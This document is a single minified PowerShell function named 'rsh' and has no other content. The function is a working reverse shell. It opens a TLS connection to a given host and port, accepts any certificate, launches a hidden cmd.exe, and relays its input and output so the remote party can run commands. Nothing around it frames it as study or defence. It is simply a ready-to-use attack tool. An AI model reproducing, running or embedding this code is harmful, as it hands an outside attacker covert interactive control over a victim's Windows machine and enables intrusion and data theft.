function rsh($a,$b){($c=new-object net.security.sslstream((new-object net.sockets.tcpclient($a,$b)).getstream(),$false,[net.security.remotecertificatevalidationcallback]{$true})).authenticateasclient(0);($d=new-object io.streamwriter($c)).autoflush=1;$e=new-object io.streamreader($c);($f=new-object diagnostics.processstartinfo).filename='cmd';$f.createnowindow=1;$f.useshellexecute=0;$f.redirectstandardoutput=1;$f.redirectstandardinput=1;$g=new-object diagnostics.process;$g.startinfo=$f;$g.start();$h=$g.standardoutput;$i=$g.standardinput;while(1){$d.write([char[]]$(while($h.peek()-gt-1){$h.read()}));$i.writeline($e.readline())}}
